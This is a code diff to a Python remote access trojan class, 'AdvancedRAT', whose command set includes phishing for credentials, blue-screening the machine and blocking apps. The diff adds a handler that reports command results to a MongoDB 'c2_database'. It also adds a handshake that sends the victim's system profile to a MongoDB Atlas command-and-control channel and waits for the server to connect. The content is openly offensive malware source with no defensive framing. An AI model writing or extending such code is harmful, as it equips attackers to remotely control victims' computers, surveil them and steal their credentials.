@@ -2324,9 +2324,37 @@ class AdvancedRAT:
             'bsod': self._handle_bsod,
             'block_apps': self._handle_block_apps,
             'phishing': self._handle_phishing,
-            'panic': self._handle_panic
+            'panic': self._handle_panic,
+            'dbmode_client': self._handle_dbmode_client
         }
     
+    def _handle_dbmode_client(self, cmd):
+        mode = cmd.get('params', {}).get('mode', 'normal')
+        self.logger.info(f"Received request to change database mode to: {mode}")
+        
+        # Manually write completed status to MongoDB
+        cmd_id = cmd.get('id', 'unknown')
+        if hasattr(self, 'mongodb_client') and self.mongodb_client:
+            try:
+                db = self.mongodb_client.get_database('c2_database')
+                import datetime
+                db.commands.update_one(
+                    {"id": cmd_id},
+                    {"$set": {
+                        "status": "completed",
+                        "result": json.dumps({"status": "success", "message": f"Switching to {mode}"}),
+                        "is_active": 0,
+                        "updated_at": datetime.datetime.now().isoformat()
+                    }}
+                )
+            except Exception as e:
+                self.logger.error(f"Failed to write dbmode result to Mongo: {e}")
+        
+        if mode == 'normal':
+            self.mongo_mode = False
+            
+        return {"status": "success", "message": f"Switched mode to {mode}"}
+        
     def _handle_phishing(self, cmd):
         """Display a phishing template to capture credentials"""
         template = cmd.get('template', 'windows')
@@ -2861,6 +2889,37 @@ class AdvancedRAT:
             self.mongodb_client = client
             db = client.get_database('c2_database')
             self.logger.success("Connected to MongoDB via Atlas (Hybrid Mode)")
+
+            # Send handshake record to signal waiting
+            sys_info = self.profiler.get_system_info()
+            db.mongo_handshake.update_one(
+                {"client_id": self.client_id},
+                {"$set": {
+                    "client_id": self.client_id,
+                    "status": "client_waiting",
+                    "info": sys_info,
+                    "timestamp": datetime.datetime.now().isoformat()
+                }},
+                upsert=True
+            )
+            self.logger.info("Sent connection request to MongoDB handshake collection.")
+            
+            # Wait for server connected response
+            connected_via_db = False
+            for _ in range(30):  # Wait up to 60 seconds
+                if not getattr(self, 'mongo_mode', False):
+                    break
+                hs = db.mongo_handshake.find_one({"client_id": self.client_id})
+                if hs and hs.get('status') == 'server_connected':
+                    connected_via_db = True
+                    break
+                time.sleep(2)
+            
+            if not connected_via_db:
+                self.logger.error("No response from server via MongoDB handshake.")
+                return
+
+            self.logger.success("Connected to C2 server through DB only!")
 
         except Exception as e:
             self.logger.error(f"MongoDB connection failed: {e}")
